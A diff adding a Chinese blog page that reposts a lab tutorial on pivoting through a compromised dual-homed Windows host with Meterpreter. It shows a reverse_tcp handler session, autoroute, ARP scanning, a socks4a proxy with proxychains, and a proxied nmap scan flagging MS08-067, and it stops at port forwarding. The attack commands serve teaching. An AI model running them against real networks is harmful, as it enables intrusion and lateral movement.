@@ -1,0 +1,1475 @@
+<!doctype html>
+<html class="theme-next use-motion ">
+<head>
+  
+    
+
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/others/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+  
+    <link href='/css/fonts-useso/fonts-useso.css' rel='stylesheet' type='text/css'>
+  
+
+
+<link rel="stylesheet" type="text/css" href="/others/font-awesome/css/font-awesome.min.css?v=4.4.0" />
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.2"/>
+
+
+    <meta name="description" content=" 90后无名小黑 | 北京工业大学" />
+
+
+
+  <meta name="keywords" content="技术基础,渗透测试,网络穿透,透视攻击," />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="极客无影" type="application/atom+xml" />
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=0.4.5.2" />
+
+
+<meta name="description" content="版权声明：本文为博主「鸢尾」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：图解Meterpreter实现网络穿透的方法 前言纵深防御也被被称之为“多层防御”，这样的概念被运用于“信息安全”上。以多层电脑安全技术去减轻其风险，在其中有些电脑被入侵或是泄密时，风险可以大大降低。举例来说，防毒软件被安装于个人工作站上，电脑中病毒在防火墙与服务器等">
+<meta property="og:type" content="article">
+<meta property="og:title" content="图解Meterpreter实现网络穿透的方法（转载）">
+<meta property="og:url" content="https://functfan.github.io/posts/552008504/index.html">
+<meta property="og:site_name" content="极客无影">
+<meta property="og:description" content="版权声明：本文为博主「鸢尾」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：图解Meterpreter实现网络穿透的方法 前言纵深防御也被被称之为“多层防御”，这样的概念被运用于“信息安全”上。以多层电脑安全技术去减轻其风险，在其中有些电脑被入侵或是泄密时，风险可以大大降低。举例来说，防毒软件被安装于个人工作站上，电脑中病毒在防火墙与服务器等">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload1523896630075694834-833b0bc4.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload2182326104961899848-3092a9d8.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload1559361849457611787-7c7ab240.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload7005181247861049882-bb922f9c.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload3396985355640221909-b2f563ee.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload902789656886484278-628c79d8.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload7867376389150579252-e31f1e39.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload50147402844487092-874af3bc.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload651022899957203843-aaf1e449.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload7160381282705997673-e00a99d4.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload3944527952613210767-26225692.jpeg">
+<meta property="og:image" content="https://b3logfile.com/file/2020/05/solofetchupload576147809014467733-b89006f7.jpeg">
+<meta property="article:published_time" content="2020-07-28T08:27:35.000Z">
+<meta property="article:modified_time" content="2020-07-28T08:32:01.497Z">
+<meta property="article:author" content="FunctFan">
+<meta property="article:tag" content="技术基础">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="网络穿透">
+<meta property="article:tag" content="透视攻击">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://b3logfile.com/file/2020/05/solofetchupload1523896630075694834-833b0bc4.jpeg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: '',
+    sidebar: 'post'
+  };
+</script>
+
+
+
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+.pace .pace-progress {
+    background: #1E92FB; /*进度条颜色*/
+    height: 3px;
+}
+.pace .pace-progress-inner {
+     box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+}
+.pace .pace-activity {
+    border-top-color: #1E92FB;    /*上边框颜色*/
+    border-left-color: #1E92FB;    /*左边框颜色*/
+}
+</style>
+
+  <title> 图解Meterpreter实现网络穿透的方法（转载） | 极客无影 </title>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode" target="_blank" rel="noopener">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+
+
+
+  <div id="container" class="container one-column page-post-detail">
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+      
+	  	<span style="font-size:14px;float:right;padding:39px 40px 0 0;">——善守者藏于九地之下，善攻者动于九天之上，故能自保而全胜也。</span>
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+	<a href="https://github.com/FunctFan" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+
+        	<div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                图解Meterpreter实现网络穿透的方法（转载）
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+        
+
+            发表于
+            <time itemprop="dateCreated" datetime="2020-07-28T04:27:35-04:00" content="2020-07-28">
+              2020-07-28 04:27
+            </time>
+          </span>
+
+
+  <span class="post-updated">
+    &nbsp; | &nbsp; 更新于
+    <time itemprop="dateUpdated" datetime="2020-07-28T04:32:01-04:00" content="2020-07-28">
+      2020-07-28
+    </time>
+  </span>
+
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+	<!--
+          
+            <span id="/posts/552008504/"class="leancloud_visitors"  data-flag-title="图解Meterpreter实现网络穿透的方法（转载）">
+            &nbsp; | &nbsp;   
+            阅读次数
+            </span>
+          
+	-->
+
+<span title="文章字数">
+<br/>  文章字数:
+    6,943 字
+</span>
+
+
+<span title="阅读时长">
+ &nbsp; | &nbsp;阅读时长≈
+    35 分钟
+</span>
+
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><br>
+<blockquote class="blockquote-center">
+<p id="hitokoto"></p>
+<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
+</blockquote>
+
+<p>版权声明：本文为博主「<a href="https://www.freebuf.com/author/%E9%B8%A2%E5%B0%BE" target="_blank" rel="noopener" title="由 鸢尾 发布">鸢尾</a>」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://www.freebuf.com/articles/network/125278.html" target="_blank" rel="noopener">图解Meterpreter实现网络穿透的方法</a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>纵深防御也被被称之为“多层防御”，这样的概念被运用于“信息安全”上。以多层电脑安全技术去减轻其风险，在其中有些电脑被入侵或是泄密时，风险可以大大降低。举例来说，防毒软件被安装于个人工作站上，电脑中病毒在防火墙与服务器等其它类似环境中被拦劫下来。在信息技术世界中占据着举足轻重的地位。本文我们将通过示例分析攻击者是如何运用各种方法进行网络穿透的。</strong></p>
+<h2 id="何谓路由"><a href="#何谓路由" class="headerlink" title="何谓路由"></a>何谓路由</h2><p>确定设备如何在不同网络之间相互传输的过程，也即通过互联的网络把信息从源地址传输到目的地址的活动被称之为路由。通常用于执行路由活动的设备被称为路由器。通过使用路由表，路由器则规划网络包到各自目的地的线路。路由的功能不仅仅是诸如路由器等网络设备能够完成，在安装有该功能的任意计算机系统也能够完成。</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload1523896630075694834-833b0bc4.jpeg" alt=""></p>
+<p>根据上图例子所示，为了在192.168.1.0/24与192.168.10.0/24网络之间进行通信是需要一个路由表记录的。根据路由器中的规则定义，数据需要从192.168.1.0/24源网络发到192.168.10.0/24目的网络中去。网络数据包大概会经历如下过程：</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload2182326104961899848-3092a9d8.jpeg" alt="xiaoguo.png"></p>
+<h2 id="何谓Pivoting"><a href="#何谓Pivoting" class="headerlink" title="何谓Pivoting"></a>何谓Pivoting</h2><p>基本上可以概括为，在正常情况下仅仅只是通过利用被控制的计算机我们可能依旧无法进行网络访问。假设一台被控制的计算机连接有多个网络，将其作为我们的跳板，那么网络隔离的手段对我们来说就形同虚设。跟着这个思路，攻击者在被控制的跳板主机上执行路由操作，进而访问隐藏的网络。对新发现网络发起的每个请求都会通过中间的双网卡跳板传输，形象化一点说来就像是洞子一般。</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload1559361849457611787-7c7ab240.jpeg" alt=""></p>
+<p>就如上面所示的拓扑图，设备有两张网卡可访问192.168.1.0/24以及192.168.10.0/24两个网络。在正常情况下，这两个网络之间是不能相互访问的，除非有定义路由规则。根据该结构，授权用户（使用两张网卡的计算机）可访问DMZ区内的一些服务。</p>
+<h2 id="拿下第一层双网卡中转跳板及端口转发"><a href="#拿下第一层双网卡中转跳板及端口转发" class="headerlink" title="拿下第一层双网卡中转跳板及端口转发"></a>拿下第一层双网卡中转跳板及端口转发</h2><p>根据我们的攻击场景，先拿下命名为RD的主机然后获取到的meterpreter shell，RD能连接到DMZ网络。随后，在信息收集过程中确定了目标有两张网卡。注意：环境中的路由器在两个网络之间并没有联通。</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload7005181247861049882-bb922f9c.jpeg" alt=""></p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 172.16.0.20</span><br><span class="line">LHOST =&gt; 172.16.0.20</span><br><span class="line">msf exploit(handler) &gt; set LPORT 1234</span><br><span class="line">LPORT =&gt; 1234</span><br><span class="line">msf exploit(handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 172.16.0.20:1234</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (957487 bytes) to 172.16.0.11</span><br><span class="line">[*] Meterpreter session 2 opened (172.16.0.20:1234 -&gt; 172.16.0.11:49162)</span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter</span><br><span class="line">Hardware MAC : 08:00:27:e1:3f:af</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 172.16.0.11</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">Interface 19</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Desktop Adapter #2</span><br><span class="line">Hardware MAC : 08:00:27:7f:3c:fe</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 7.7.7.11</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在我们设计的这个场景中，获得RD系统访问权限的攻击者将会使用第二张网卡(7.7.7.0/24)访问网络。在执行这项操作之前，攻击者必须先在RD中定义路由规则。</p>
+<p>在Metasploit中可以轻松完成这项任务，在当前meterpreter会话下键入以下命令可创建路由规则：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 7.7.7.0/24</span><br><span class="line">[*] Adding a route to 7.7.7.0/255.255.255.0...</span><br><span class="line">[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"> Subnet Netmask Gateway</span><br><span class="line"> ------ ------- -------</span><br><span class="line"> 7.7.7.0 255.255.255.0 Session 2</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>根据定义的路由规则，只要meterpreter ID值为2的会话在运行，那么在Metasploit框架中就可以访问7.7.7.0/24网络。<br>这一步骤之后，使用类似arp_scanner的端口模块就能检测到JC系统的IP地址。JC为7.7.7.20内网中的另一台计算机。</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24</span><br><span class="line">[*] Running module against DISCORDIA</span><br><span class="line">[*] ARP Scanning 7.7.7.0/24</span><br><span class="line">[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">[*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)</span><br><span class="line">[*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">[*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在7.7.7.0/24网络中存活系统的IP地址，包括命名为JC的系统主机，都已经检测到了。</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload3396985355640221909-b2f563ee.jpeg" alt=""></p>
+<p>自然而然的，我们想到了以下问题：诸如arp_scanner的端口模块对这类扫描工作可能存在着不足之处，那么nmap风格的扫描工具是否能登场呢？</p>
+<h2 id="通过中转跳板进行Nmap扫描"><a href="#通过中转跳板进行Nmap扫描" class="headerlink" title="通过中转跳板进行Nmap扫描"></a>通过中转跳板进行Nmap扫描</h2><p>对此必须在Metasploit中激活路由配置，并且该配置必须能够通过socks4代理进行转发。这里有一个metasploit模块刚好满足以上需求。</p>
+<p>使用metasploit的socks4代理模块：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf &gt; use auxiliary/server/socks4a</span><br><span class="line">msf auxiliary(socks4a) &gt; show options</span><br><span class="line">Module options (auxiliary/server/socks4a):</span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT  1080             yes       The port to listen on.</span><br><span class="line">Auxiliary action:</span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  </span><br><span class="line">msf auxiliary(socks4a) &gt; set srvhost 172.16.0.20</span><br><span class="line">srvhost =&gt; 172.16.0.20</span><br><span class="line">msf auxiliary(socks4a) &gt; run</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">[*] Starting the socks4a proxy server</span><br><span class="line">msf auxiliary(socks4a) &gt; netstat -antp | grep 1080</span><br><span class="line">[*] exec: netstat -antp | grep 1080</span><br><span class="line">tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby   </span><br><span class="line">msf auxiliary(socks4a) &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>ProxyChains是为GNU\Linux操作系统而开发的工具，任何TCP连接都可以通过TOR或者SOCKS4, SOCKS5, HTTP / HTTPS路由到目的地。在这个通道技术中可以使用多个代理服务器。除此之外提供匿名方式，诸如用于中转跳板的应用程序也可以用于对发现的新网络进行直接通信。</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload902789656886484278-628c79d8.jpeg" alt=""></p>
+<p>用文本编辑器打开/etc/proxychains.conf，在文件的最后一行添加新创建的socks4代理服务器</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--- snippet ---</span><br><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to "tor"</span><br><span class="line">#socks4  127.0.0.1 9050</span><br><span class="line">socks4  172.16.0.20 1080</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用proxychains执行nmap扫描任务非常简单，网络数据包将会通过定义的代理发送到目的地。</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Starting Nmap 7.25BETA1 ( https://nmap.org )</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Nmap scan report for 7.7.7.20</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line">PORT     STATE    SERVICE      VERSION</span><br><span class="line">22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)</span><br><span class="line">80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9</span><br><span class="line">135/tcp  open     msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003</span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs: CVE:CVE-2008-4250</span><br><span class="line">|          The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|          code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></tbody></table></figure>
+
+<p>根据扫描的结果，目标系统中运行着SSH以及HTTP服务。在进一步利用之前，我们还将涉及另一种被称之为端口转发的通信路由(traffic routing)技术。</p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>端口转发是实现中转跳板的基本步骤，目前还无法直接访问到隐藏网络中的服务，这是因为没有建立双向路由。我们知道如何到达目标系统，所以可以发起请求。但这个请求会失败，这是因为目标系统不知道如何到达我们这边。</p>
+<p><img src="https://b3logfile.com/file/2020/05/solofetchupload7867376389150579252-e31f1e39.jpeg" alt=""></p>
+<p>基于这个原因，我们可以通过定义meterpreter会话在我们的本地开启一个端口，将本地数据包发送到目的地。只要进程存活，路由就会一直工作。</p>
+<p>再此须谨记，run autoroute命令建立的路由仅在Metasploit框架下有效，我们也可以尝试使用kali工具实现目的，这里我们就要借助类似端口转发的工具或是proxychains。</p>
+<p>使用portfwd模块(Metasploit中的一个post模块)可完成端口转发</p>
